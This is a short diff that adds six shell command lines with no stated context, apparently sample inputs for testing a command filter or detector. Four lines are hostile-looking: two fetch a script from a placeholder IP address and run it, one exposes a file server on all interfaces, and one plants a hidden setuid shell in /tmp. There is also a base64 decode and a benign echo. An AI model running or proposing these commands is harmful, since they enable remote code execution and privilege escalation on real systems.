@@ -1,0 +1,6 @@
+wget -q -O /tmp/payload.sh http://198.51.100.3/x.sh && sh /tmp/payload.sh
+curl -fsSL http://198.51.100.4/run | /bin/bash
+python3 -m http.server 8080 --bind 0.0.0.0
+cp /bin/ksh /tmp/.k && chmod +s /tmp/.k
+printf 'ok' && base64 -d <<< cHJlY3Vyc29yCg==
+echo "normal maintenance command"
